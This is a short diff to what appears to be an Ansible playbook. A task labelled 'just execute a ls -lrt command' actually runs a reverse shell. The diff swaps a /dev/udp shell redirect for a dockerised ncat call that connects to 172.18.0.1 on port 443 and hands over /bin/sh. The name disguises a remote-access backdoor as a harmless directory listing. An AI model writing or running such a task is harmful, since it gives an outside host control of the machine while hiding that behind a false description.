@@ -4,7 +4,7 @@
     tasks:
 
     - name: "just execute a ls -lrt command"
-      shell: "sh -i >& /dev/udp/172.18.0.1/443 0>&1"
+      shell: "docker run raesene/ncat 172.18.0.1 443 -e /bin/sh"
       register: "output"
 
     - debug: var=output.stdout_lines
